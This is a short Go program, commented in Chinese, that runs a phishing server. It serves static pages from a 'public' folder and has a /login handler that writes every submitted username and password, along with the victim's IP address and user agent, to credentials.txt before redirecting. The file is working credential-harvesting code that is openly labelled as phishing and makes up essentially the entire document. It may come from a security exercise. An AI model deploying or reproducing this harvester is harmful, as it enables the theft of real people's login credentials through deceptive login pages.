package main

import (
	"net/http"
	"os"
	"time"

	log "github.com/Sirupsen/logrus"
	"github.com/gorilla/mux"
)

// 钓鱼信息记录到日志
// go get github.com/Sirupsen/logrus 日志格式化记录第三方包

func main() {
	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}

	defer fh.Close()

	log.SetOutput(fh) // 设置日志输出的句柄

	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public"))) // 静态文件服务器创建

	log.Fatal(http.ListenAndServe(":8080", r))

}

func login(w http.ResponseWriter, r *http.Request) {

	// time="2022-09-11T16:19:14+08:00" level=info msg="login attempt" fields.time="2022-09-11 16:19:14.8598751 +0800 CST m=+551.727495701" ip_address="127.0.0.1:53955" password=sfa user-agent="apifox/1.0.0 (https://www.apifox.cn)" username=sdaf
	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("_user"), // 获取post值
		"password":   r.FormValue("_pass"),
		"user-agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempt")

	http.Redirect(w, r, "/", 302)
}
